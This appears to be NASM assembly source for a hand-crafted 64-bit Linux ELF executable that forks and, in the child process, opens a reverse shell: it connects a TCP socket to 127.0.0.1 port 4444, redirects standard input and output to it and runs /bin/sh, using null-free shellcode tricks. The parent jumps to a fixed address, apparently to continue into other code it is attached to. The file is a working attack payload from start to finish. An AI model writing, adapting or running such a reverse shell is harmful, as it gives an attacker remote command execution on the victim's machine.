BITS 64

        org 0x401000

ehdr:                                       ; ELF64_Ehdr
            db  0x7f, "ELF", 2, 1, 1, 0     ;e_ident = 0x7ELF, 64-bit, little endian, Current Version
    times 8 db  0                           ;mandatory padding
            dw  2                           ;e_type = executable file
            dw  62                          ;e_machine = amd64
            dd  1                           ;e_version = current
            dq  _start                      ;e_entry
            dq  phdr - $$                   ;e_phoff
            dq  0                           ;e_shoff
            dd  0                           ;e_flags
            dw  ehdrsize                    ;e_ehsize
            dw  phdrsize                    ;e_phentsize
            dw  1                           ;e_phnum
            dw  0                           ;e_shentsize
            dw  0                           ;e_shnum
            dw  0                           ;e_shstrndx

ehdrsize    equ $ - ehdr                    ;calculate ehdrsize

phdr:                                       ; ELF64_Phdr
        dd  1                               ;p_type = Loadable program segment
        dd  5                               ;p_flags = b101 = Read and Execute
        dq  0                               ;p_offset
        dq  $$                              ;p_vaddr
        dq  $$                              ;p_paddr
        dq  filesize                        ;p_filesz = overall filesize
        dq  filesize                        ;p_memsz
        dq  0x1000                          ;p_align

phdrsize    equ $ - phdr                    ;calculate phdrsize

    global  _start

    section .text

_start:
        mov rax,    57                      ;fork()
        syscall                             ;
        cmp rax,    0                       ;0==child process
        jz  socket                          ;jmp to socket if child
        mov rax, 0x004010cd                 ;mov location to jmp into rax
        jmp rax                             
socket:
        push    byte    41                  ; push/pop will set syscall num for socket
        pop rax
        cdq                                 ; cdq sets rdx to 0 if rax is positive
        push    byte    2                   ; AF_INET = 2
        pop rdi                 
        push    byte    1                   ; SOCK_STREAM = 1
        pop rsi 
        syscall                             ; socket(AF_INET, SOCK_STREAM, 0)

connect:
        xchg    eax,    edi                 ; rdi is 2, so moving only al is doable
        mov al, 42  
        mov rcx,    0xfeffff80a3eefffe      ; socket address and port: 127.0.0.1 4444
        neg rcx                             ; negate the value since we provided a negated value (avoiding nulls)
        push    rcx
        push    rsp                         ; mov rsi,rsp. This is the pointer to sockaddr
        pop rsi
        mov     dl, 16                      ; sockaddr length
        syscall                             ; connect(s, addr, len(addr)

dup2:
        push    byte    3                   ; start with 3 and decrement
        pop rsi

dup2_loop:
        mov al, 33                          ; duplicate socket fd to stdin, stdout, stderr
        dec esi
        syscall                             ; dup2(s, rsi)
        jnz dup2_loop                       ; jump when esi != 0

execve:
        cdq
        mov al, 59                          ; execve
        push    rdx                         ; put null-byte in /bin/sh
        mov rcx,    0x68732f2f6e69622f      ; /bin/sh
        push    rcx
        push    rsp                         ; rsp points to top of the stack where /bin/sh resides
        pop rdi                             ; use a push/pop to prevent null-byte and get a shorter shellcode
        syscall                             ; execve('/bin/sh',0,0)

exit:
        mov rax,    60                      ;sys_exit
        syscall

filesize    equ $ - $$                      ;calculate entire filesize
